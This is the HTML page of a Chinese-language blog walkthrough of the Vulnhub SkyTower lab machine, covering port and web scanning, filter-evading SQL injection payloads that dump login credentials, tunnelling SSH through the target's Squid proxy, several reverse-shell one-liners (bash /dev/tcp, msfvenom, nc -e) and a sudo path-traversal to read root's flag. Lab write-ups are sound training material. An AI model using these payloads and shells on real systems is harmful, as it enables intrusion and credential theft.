@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="靶机下载链接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-SkyTower">
+<meta property="og:url" content="http://atsud0.me/2020/07/12/Vulnhub-SkyTower/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="靶机下载链接">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200712_094527.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200712_121353.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200712_122608.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200712_123740.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200712_120618.jpg">
+<meta property="article:published_time" content="2020-07-12T04:59:53.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.458Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="sql-injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200712_094527.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/07/12/Vulnhub-SkyTower/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Vulnhub-SkyTower | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/07/12/Vulnhub-SkyTower/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulnhub-SkyTower
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-07-12 12:59:53" itemprop="dateCreated datePublished" datetime="2020-07-12T12:59:53+08:00">2020-07-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/Vulnhub/" itemprop="url" rel="index"><span itemprop="name">Vulnhub</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>5.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>5 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><a href="https://www.vulnhub.com/entry/skytower-1,96/" target="_blank" rel="noopener">靶机下载链接</a></p>
+<a id="more"></a>
+
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80,3128 -sC -sV -O 192.168.56.3</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.56.3</span><br><span class="line">Host is up (0.00083s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE    VERSION</span><br><span class="line">22&#x2F;tcp   filtered ssh</span><br><span class="line">80&#x2F;tcp   open     http       Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.22 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">3128&#x2F;tcp open     http-proxy Squid http proxy 3.1.20</span><br><span class="line">|_http-server-header: squid&#x2F;3.1.20</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="line">MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 37.12 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;background (Status: 200)</span><br><span class="line">&#x2F;cgi-bin&#x2F; (Status: 403)</span><br><span class="line">&#x2F;index (Status: 200)</span><br><span class="line">&#x2F;login.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br></pre></td></tr></table></figure>
+
+<h3 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;192.168.56.3</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.56.3</span><br><span class="line">+ Target Hostname:    192.168.56.3</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-07-12 12:44:05 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.2.22 (Debian)</span><br><span class="line">+ Server leaks inodes via ETags, header found with file &#x2F;, inode: 87, size: 1136, mtime: Fri Jun 20 19:23:36 2014</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Uncommon header &#39;tcn&#39; found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http:&#x2F;&#x2F;www.wisec.it&#x2F;sectou.php?id&#x3D;4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.html</span><br><span class="line">+ Apache&#x2F;2.2.22 appears to be outdated (current is at least Apache&#x2F;2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Retrieved x-powered-by header: PHP&#x2F;5.4.4-14+deb7u9</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS</span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</span><br><span class="line">+ &#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 8346 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-07-12 12:44:36 (GMT8) (31 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>经过探索，我发现首页的登录页面存在sql注入，并且去空了or,不仅如此，它还过滤了select 和逗号，等号，and。人都傻了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_094527.jpg" alt=""></p>
+<figure class="highlight plain"><figcaption><span>sql-post</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">email&#x3D;&#39; oorrder by 3 # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union ALL sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect 2)b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union ALL sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect version())b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union ALL sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect database())b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect group_concat(table_name) from infoorrmation_schema.tables where table_schema like &#39;SkyTech&#39; )b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect group_concat(column_name) from infoorrmation_schema.columns where table_schema like &#39;SkyTech&#39; aandnd table_name like &#39;login&#39;)b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect group_concat(email) from login)b JOIN (sselectelect group_concat(passwoorrd) from login)c) # &amp;password&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>成功爆破数据库后，会发现出来的页面是一个提示登录到ssh。已经给出了密码。通过sql注入点读取了/etc/passwd，确认了的确是有这三个用户的存在。接下来就要考虑该如何连进去了，因为22端口有防火墙的保护。</p>
+<p>使用proxychains连接目标机器的squid http proxy代理。</p>
+<h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line">#socks4         127.0.0.1 9050</span><br><span class="line">http 192.168.56.3 3128</span><br></pre></td></tr></table></figure>
+
+<p>之后就<code>proxychains ssh john@192.168.56.3</code>。但是会立刻闪退，谷歌之后猜测应该是目标机器设置了UsePAM yes的。三个用户我都尝试去登录了，只有william这个用户登录失败。同样的sara和john只要一连接上去就会退出。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_121353.jpg" alt=""></p>
+<p>这样的话，尝试直接ssh登录之后就运行命令如何?</p>
+<h3 id="弹shell"><a href="#弹shell" class="headerlink" title="弹shell"></a>弹shell</h3><p>一开始尝试 bash反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh john@192.168.56.3 &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.254&#x2F;1234 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure>
+<p>但是很遗憾不行，一运行这个命令，虽然是接受到了监听，但是两边都退出了。虽然反弹失败了，但是我们是不是可以考虑正向弹shell呢？<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_122608.jpg" alt=""></p>
+<p>果然成功的收到了shell。</p>
+<p>尝试其他反弹shell的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;192.168.56.254 LPORT&#x3D;1234</span><br><span class="line">0&lt;&amp;177-;exec 177&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.56.254&#x2F;1234;sh &lt;&amp;177 &gt;&amp;177 2&gt;&amp;177</span><br><span class="line"></span><br><span class="line">p4 ssh john@192.168.56.3 &quot;0&lt;&amp;177-;exec 177&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.56.254&#x2F;1234;sh &lt;&amp;177 &gt;&amp;177 2&gt;&amp;177&quot;</span><br></pre></td></tr></table></figure>
+<p>这个命令也成功了。</p>
+<p>nc反弹也可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4 ssh john@192.168.56.3 &quot;nc 192.168.56.254 1234 -e &#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>拿到反弹shell后，我使用john用户进行了信息枚举，但是没发现什么特别的东西。随后我切换到了sara。发现这个用户能够执行sudo命令。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_123740.jpg" alt=""></p>
+<p>能够使用/bin/cat 查看/accounts下的任意文件。那么我们就可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat &#x2F;accounts&#x2F;..&#x2F;root&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200712_120618.jpg" alt=""></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>多尝试姿势。。<code>bash -c &#39;bash -i ...&#39;</code>不是万能的。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>-<a href="https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/" target="_blank" rel="noopener">SQLi-——-逗号，空格，字段名过滤突破</a><br>-<a href="https://www.vpsvt.com/reed/415.html" target="_blank" rel="noopener">ssh登录时出现闪退问题解决方法</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/07/12/Vulnhub-SkyTower/" title="Vulnhub-SkyTower">http://atsud0.me/2020/07/12/Vulnhub-SkyTower/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql-injection</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/11/Vulnhub-pWnOS2/" rel="prev" title="Vulnhub-pWnOS2.0">
+      <i class="fa fa-chevron-left"></i> Vulnhub-pWnOS2.0
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/12/Vulnhub-PwnLab/" rel="next" title="Vulnhub-PwnLab">
+      Vulnhub-PwnLab <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-信息收集"><span class="nav-number">1.</span> <span class="nav-text">0x01 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap扫描"><span class="nav-number">1.1.</span> <span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录扫描"><span class="nav-number">1.2.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nikto扫描"><span class="nav-number">1.3.</span> <span class="nav-text">nikto扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">2.1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置代理"><span class="nav-number">2.2.</span> <span class="nav-text">设置代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#弹shell"><span class="nav-number">2.3.</span> <span class="nav-text">弹shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-提权"><span class="nav-number">3.</span> <span class="nav-text">0x03 提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">4.</span> <span class="nav-text">0x04 总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">4.1.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
